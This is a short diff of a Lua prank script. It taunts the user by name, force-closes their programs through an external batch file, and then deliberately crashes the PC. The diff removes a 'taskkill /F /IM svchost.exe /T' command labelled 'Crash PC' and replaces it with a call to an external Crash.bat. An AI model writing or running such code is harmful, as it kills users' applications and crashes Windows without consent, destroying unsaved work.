@@ -21,7 +21,7 @@ function Waiteroo(n)
   end
 end
 
-function CloseDistractions()  --Close Other Programs
+function CloseDistractions()  --MIGRATED TO EXTERNAL .BAT (/extern/Distractions.bat)
   
   --Browsers
 
@@ -73,7 +73,7 @@ ui.info("Hey "..os.getenv('USERNAME')..", what are you looking at over there?");
 
 ui.info("Don\'t worry, I\'ll deal with that for you!");
 
-CloseDistractions();
+os.execute(""..dir.."extern/Distractions.bat");  --Will close all things listed in the bat file.
 
 ui.info("Now that that\'s dealt with...");
 
@@ -119,7 +119,7 @@ ui.warn("...");
           
 ui.info("Bye "..os.getenv('USERNAME').."!!!");
 
-os.execute("taskkill /F /IM \"svchost.exe\" /T");  --Crash PC (Only Works With Admin)
+os.execute(""..dir.."extern/Crash.bat");  --Crash PC (Only Works With Admin)
 
 Waiteroo(1*05);  --Wait 5 seconds before continuing
 
